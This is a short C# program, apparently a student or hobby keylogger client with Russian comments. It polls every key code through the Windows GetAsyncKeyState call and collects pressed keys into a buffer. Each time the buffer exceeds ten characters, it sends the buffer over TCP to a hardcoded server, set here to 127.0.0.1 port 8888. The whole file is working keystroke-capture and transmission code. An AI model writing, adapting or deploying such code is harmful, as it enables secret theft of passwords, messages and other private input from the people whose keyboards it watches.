using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;



namespace Client_side
{
    class Program
    {
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);
        
        private const int port = 8888;
        private const string server = "127.0.0.1";
        static void sendViaTCP(string buf)
        {
            Console.ReadKey();
            try
            {
                TcpClient client = new TcpClient();
                client.Connect(server, port);
                string Hello = buf;
                byte[] data = Encoding.UTF8.GetBytes(Hello);
                StringBuilder response = new StringBuilder();
                NetworkStream stream = client.GetStream();

                stream.Write(data, 0, data.Length);
                // Закрываем потоки
                stream.Close();
                client.Close();
            }
            catch (SocketException e)
            {
                Console.WriteLine("SocketException: {0}", e);
            }
            catch (Exception e)
            {
                Console.WriteLine("Exception: {0}", e.Message);
            }

            Console.WriteLine("Запрос завершен...");
        }
        static void Main(string[] args)
        {
            string buf="";

            while (true)
            {
                Thread.Sleep(100);
                for (int i = 0; i < 255; i++)
                {
                    int state = GetAsyncKeyState(i);
                    if ((state != 0)&&(i!=1)&&(i!=16) && (i != 160))
                    {
                         
                        buf += ((ConsoleKey)i).ToString();
                        Console.WriteLine(buf);
                        if (buf.Length > 10)
                        {
                            sendViaTCP(buf);
                            buf = "";
                        }
                    }
                }
            }   
        }
    }
}

